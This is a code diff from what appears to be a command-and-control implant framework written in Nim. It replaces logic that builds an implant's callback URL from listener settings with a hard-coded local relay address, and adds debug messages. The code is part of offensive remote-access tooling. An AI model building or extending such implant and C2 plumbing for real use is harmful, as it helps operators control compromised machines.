@@ -1588,25 +1588,11 @@ proc httpHandler() {.async.} =
                         
                         # Build C2 URL only if we don't have RELAY_CHAIN (standard agent)
                         when RELAY_CHAIN == "":
-                            if listener.implantCallbackIp.startsWith("http://") or listener.implantCallbackIp.startsWith("https://"):
-                                # Use the full URL as-is (already has protocol)
-                                c2Url = listener.implantCallbackIp
-                                when defined debug:
-                                    echo "[RELAY] 🌐 Using full URL from implantCallbackIp: " & c2Url
-                            elif listener.implantCallbackIp != "":
-                                # Build URL from components: listenerType + implantCallbackIp + listenerPort
-                                let protocol = if listener.listenerType != "": toLowerAscii(listener.listenerType) else: "http"
-                                let host = listener.implantCallbackIp
-                                let port = listener.listenerPort
-                                
-                                # Only add port if it's not the default for the protocol
-                                if (protocol == "http" and port != "80") or (protocol == "https" and port != "443"):
-                                    c2Url = protocol & "://" & host & ":" & port
-                                else:
-                                    c2Url = protocol & "://" & host
-                                
-                                when defined debug:
-                                    echo "[RELAY] 🔧 Built C2 URL - Protocol: " & protocol & ", Host: " & host & ", Port: " & port
+                            # For runtime relay servers, always use local Implants Server (port 8080)
+                            # This ensures relay traffic goes to the correct server endpoint
+                            c2Url = "http://127.0.0.1:8080"
+                            when defined debug:
+                                echo "[RELAY] 🎯 Runtime relay configured to use local Implants Server: " & c2Url
                         
                         when defined debug:
                             if c2Url != "":
